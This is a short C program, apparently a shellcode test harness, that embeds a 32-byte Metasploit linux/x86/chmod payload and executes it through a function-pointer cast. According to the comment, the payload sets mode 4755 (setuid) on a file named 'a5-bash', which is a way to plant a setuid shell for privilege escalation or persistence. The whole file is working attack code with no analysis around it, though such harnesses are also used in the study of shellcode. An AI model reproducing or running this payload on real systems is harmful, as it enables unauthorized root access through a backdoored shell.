#include<stdio.h>
#include<string.h>
/*
 * linux/x86/chmod - 32 bytes
 * http://www.metasploit.com
 * VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
 * PrependSetreuid=false, PrependSetuid=false, 
 * PrependSetresgid=false, PrependSetregid=false, 
 * PrependSetgid=false, PrependChrootBreak=false, 
 * AppendExit=false, FILE=a5-bash, MODE=4755
 */
unsigned char code[] = \
"\x99\x6a\x0f\x58\x52\xe8\x08\x00\x00\x00\x61\x35\x2d\x62\x61"
"\x73\x68\x00\x5b\x68\xed\x09\x00\x00\x59\xcd\x80\x6a\x01\x58"
"\xcd\x80";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
